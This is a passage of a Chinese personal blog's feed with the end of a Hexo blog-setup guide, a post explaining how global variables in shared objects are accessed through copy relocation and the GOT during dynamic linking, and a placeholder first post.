plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d   //推送</span><br></pre></td></tr></table></figure><ol start="2"><li>主题配置文件:&#x2F;theme&#x2F;_config.yml</li></ol><p>报错解决:安装swig(需要在当前目录下面安装)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i hexo-renderer-swig</span><br></pre></td></tr></table></figure><h2 id="配置"><a href="#配置" class="headerlink" title="配置:"></a>配置:</h2><p>在站点目录下面的_config.yml 里面可以修改标题，name。</p><p>在主题目录下面的_config.yml 里面可以修改其他的样式</p><h2 id="文章分类"><a href="#文章分类" class="headerlink" title="文章分类"></a>文章分类</h2><ol><li>添加分类:</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page categories</span><br></pre></td></tr></table></figure><ol start="2"><li>修改生成的md文件:</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">—</span><br><span class="line"></span><br><span class="line">title: 文章分类                              ##这个是打开页面的标题</span><br><span class="line"></span><br><span class="line">date: <span class="number">2020</span><span class="number">-02</span><span class="number">-18</span> <span class="number">05</span>:<span class="number">07</span>:<span class="number">50</span></span><br><span class="line"></span><br><span class="line">type: “categories”</span><br><span class="line"></span><br><span class="line">—</span><br></pre></td></tr></table></figure><p>打开文章的.md文件，加上:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">categories:分类名称</span><br></pre></td></tr></table></figure><h2 id="新建文章"><a href="#新建文章" class="headerlink" title="新建文章:"></a>新建文章:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo n <span class="string">&quot;标题&quot;</span></span><br></pre></td></tr></table></figure><h2 id="设置文章标签"><a href="#设置文章标签" class="headerlink" title="设置文章标签:"></a>设置文章标签:</h2><p>和catrgories一样的操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo n page <span class="string">&quot;tags&quot;</span></span><br></pre></td></tr></table></figure><p>然后加上:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type: tags</span><br></pre></td></tr></table></figure><p>在文章里面加上:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tags:</span><br><span class="line">- tags1</span><br><span class="line">- tags2</span><br></pre></td></tr></table></figure><h2 id="文章模板"><a href="#文章模板" class="headerlink" title="文章模板:"></a>文章模板:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 我的第一篇blog</span><br><span class="line">date: <span class="number">2022</span><span class="number">-09</span><span class="number">-04</span> <span class="number">19</span>:<span class="number">59</span>:<span class="number">07</span></span><br><span class="line">tags: </span><br><span class="line">    - tag1</span><br><span class="line">    - tag2</span><br><span class="line">categories: </span><br><span class="line">    - category1</span><br><span class="line">cover: /img/<span class="number">404.</span>jpg</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">这里随便瞎写一点东西</span><br></pre></td></tr></table></figure><h2 id="配置图片路径"><a href="#配置图片路径" class="headerlink" title="配置图片路径:"></a>配置图片路径:</h2><ol><li>在站点配置文件里面修改:</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post_asset_folder: <span class="literal">true</span></span><br></pre></td></tr></table></figure><ol start="2"><li>执行命令:</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-asset-image</span><br></pre></td></tr></table></figure><ol start="3"><li>图片路径问题处理:</li></ol><p>修改代码文件: blog\node_modules\hexo-asset-image\index.js</p><p><img src="https://h4ckf0rfun.github.io/2022/09/04/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/Untitled%201.png" alt="Untitled"></p><ol start="4"><li>md文件里面直接写图片名称就行</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;hexo-搭建博客&quot;&gt;&lt;a href=&quot;#hexo-搭建博客&quot; class=&quot;headerlink&quot; title=&quot;hexo 搭建博客&quot;&gt;&lt;/a&gt;hexo 搭建博客&lt;/h1&gt;&lt;h2 id=&quot;Start&quot;&gt;&lt;a href=&quot;#Start&quot; class=&quot;header</summary>
      
    
    
    
    <category term="日记" scheme="https://h4ckf0rfun.github.io/categories/%E6%97%A5%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>动态链接时.so文件内部全局变量的处理</title>
    <link href="https://h4ckf0rfun.github.io/2022/09/04/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E6%97%B6so%E6%96%87%E4%BB%B6%E5%86%85%E9%83%A8%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E7%9A%84%E5%A4%84%E7%90%86/"/>
    <id>https://h4ckf0rfun.github.io/2022/09/04/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E6%97%B6so%E6%96%87%E4%BB%B6%E5%86%85%E9%83%A8%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E7%9A%84%E5%A4%84%E7%90%86/</id>
    <published>2022-09-04T13:09:36.000Z</published>
    <updated>2022-09-04T13:42:54.557Z</updated>
    
    <content type="html"><![CDATA[<p>示例代码:</p><p>a.c:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> var = <span class="number">0x1234</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">var = <span class="number">0x100</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">int</span> var;</span><br><span class="line"><span class="type">int</span> a = <span class="number">10087</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">a = <span class="number">0x1234</span>;</span><br><span class="line">var = <span class="number">12345</span>;</span><br><span class="line">test();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一般情况下如果在main里面引用到了 一个共享对象内部的全局变量，那么在main的bss段就会有一个该变量的副本，并且会将该副本作为主体。那么共享对象内部的代码就会有点特殊了:</p><p>先看一下main.c里面对var操作的汇编代码:</p><p><img src="https://h4ckf0rfun.github.io/2022/09/04/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E6%97%B6so%E6%96%87%E4%BB%B6%E5%86%85%E9%83%A8%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E7%9A%84%E5%A4%84%E7%90%86/Untitled.png" alt="Untitled"></p><p>直接取到main里面.bss段上的var，然后修改它的值。如果共享对象里面的代码也是这样的，那程序不就乱了吗????</p><p>共享对象里面的代码:</p><p><img src="https://h4ckf0rfun.github.io/2022/09/04/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E6%97%B6so%E6%96%87%E4%BB%B6%E5%86%85%E9%83%A8%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E7%9A%84%E5%A4%84%E7%90%86/Untitled%201.png" alt="Untitled"></p><p>通过一个二级指针，拿到了main的.bss段上面的var，并修改它的值</p><p>(可以通过libc里面来leak主程序基址)</p><p>上面这种是一般情况，有没有什么方法能够将共享对象里面的那个var作为本体呢?，编译时加上-fPIC即可</p><p><img src="https://h4ckf0rfun.github.io/2022/09/04/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E6%97%B6so%E6%96%87%E4%BB%B6%E5%86%85%E9%83%A8%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E7%9A%84%E5%A4%84%E7%90%86/Untitled%202.png" alt="Untitled"></p><p>那么现在main里面的代码也必定和之前的不同:</p><p><img src="https://h4ckf0rfun.github.io/2022/09/04/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E6%97%B6so%E6%96%87%E4%BB%B6%E5%86%85%E9%83%A8%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E7%9A%84%E5%A4%84%E7%90%86/Untitled%203.png" alt="Untitled"></p><p>现在main里面的代码变成了二级指针的方式，最后取到了共享对象里面那个var的地址</p><p>再看看共享对象里面的代码:</p><p><img src="https://h4ckf0rfun.github.io/2022/09/04/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E6%97%B6so%E6%96%87%E4%BB%B6%E5%86%85%E9%83%A8%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E7%9A%84%E5%A4%84%E7%90%86/Untitled%204.png" alt="Untitled"></p><p>和之前的没太大区别，只不过现在rax是它自己里面的那个var</p><p>(上述的二级指针操作实际上就是通过GOT间接访问数据)</p><p>(参考: 《程序员的自我修养》)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;示例代码:&lt;/p&gt;
&lt;p&gt;a.c:&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;</summary>
      
    
    
    
    <category term="CTF" scheme="https://h4ckf0rfun.github.io/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>我的第一篇blog</title>
    <link href="https://h4ckf0rfun.github.io/2022/09/04/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87blog/"/>
    <id>https://h4ckf0rfun.github.io/2022/09/04/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87blog/</id>
    <published>2022-09-04T11:59:07.000Z</published>
    <updated>2022-09-04T12:17:10.424Z</updated>
    
    <content type="html"><![CDATA[<p>这里随便瞎写一点东西</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里随便瞎写一点东西&lt;/p&gt;
</summary>
      
    
    
    
    <category term="category1" scheme="https://h4ckf0rfun.github.io/categories/category1/"/>
    
    
    <category term="tag1" scheme="https://h4ckf0rfun.github.io/tags/tag1/"/>
    
    <category term="tag2" scheme="https://h4ckf0rfun.github.io/tags/tag2/"/>
    
  </entry>
  
</feed>
